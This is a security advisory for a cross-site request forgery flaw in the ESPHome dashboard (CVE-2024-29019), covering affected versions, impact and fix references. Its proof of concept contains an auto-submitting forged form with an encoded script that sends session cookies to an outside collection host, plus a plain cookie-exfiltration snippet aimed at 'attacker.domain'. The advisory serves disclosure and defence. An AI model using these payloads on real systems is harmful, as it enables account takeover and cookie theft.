# [H] ESPHome vulnerable to Authentication bypass via Cross site request forgery

## Summary
Severity: High
Advisory: GHSA-5925-88xh-6h99
CVE: CVE-2024-29019
CWE: CWE-352
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2024-03-21
Source: https://github.com/advisories/GHSA-5925-88xh-6h99
Type: github-advisory

## Affected
- PyPI: `esphome` — affected >=2023.12.9 <2024.3.0

## Details
### Summary
API endpoints in dashboard component of ESPHome version 2023.12.9 (command line installation) are vulnerable to Cross-Site Request Forgery (CSRF) allowing remote attackers to carry out attacks against a logged user of the dashboard to perform operations on configuration files (create, edit, delete).

### Details
It is possible for a malicious actor to create a specifically crafted web page that triggers a cross site request against ESPHome, this allows bypassing the authentication for API calls on the platform.

### PoC
An example of malicious web page that abuses this vulnerability:


<html>
  <body>
	<form action="http://localhost:6052/edit?configuration=poc.yaml" id="#main" method="POST" enctype="text/plain" onsubmit="setTimeout(function () { window.location.reload(); }, 10)">
  	<input type="hidden" name="&lt;script&gt;&#13;&#10;fetch&#40;&apos;https&#58;&#47;&#47;907zv9yp9u3rjerkiakydpvcr3xulk99&#46;oastify&#46;com&#63;x" value="y&apos;&#44;&#32;&#123;&#13;&#10;method&#58;&#32;&apos;POST&apos;&#44;&#13;&#10;mode&#58;&#32;&apos;no&#45;cors&apos;&#44;&#13;&#10;body&#58;document&#46;cookie&#13;&#10;&#125;&#41;&#59;&#13;&#10;&lt;&#47;script&gt;&#13;&#10;" />
	</form>

	<script>
  	document.forms[0].submit();
	</script>

	<script>
	</script>
  </body>
</html>

In which an attacker creates and weaponizes "poc.yaml" config file containing a cookie exfiltration script and forces the payload triggering visiting the vulnerable page.


Example of such script:
<script>
fetch('https://attacker.domain', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>


### Impact
This vulnerability allows bypassing authentication on API calls accessing configuration file operations on the behalf of a logged user. In order to trigger the vulnerability, the victim must visit a weaponized page.

In addition to this, it is possible to chain this vulnerability with GHSA-9p43-hj5j-96h5 (as seen in the PoC) to obtain a complete takeover of the user account.

## References
- https://github.com/esphome/esphome/security/advisories/GHSA-5925-88xh-6h99
- https://nvd.nist.gov/vuln/detail/CVE-2024-29019
- https://github.com/esphome/esphome/pull/6396
- https://github.com/esphome/esphome/pull/6397
- https://github.com/esphome/esphome/commit/c56c40cb824e34ed2b89ba1cb8a3a5eb31459c74
- https://github.com/advisories/GHSA-9p43-hj5j-96h5
- https://github.com/esphome/esphome
- https://github.com/esphome/esphome/releases/tag/2024.3.0
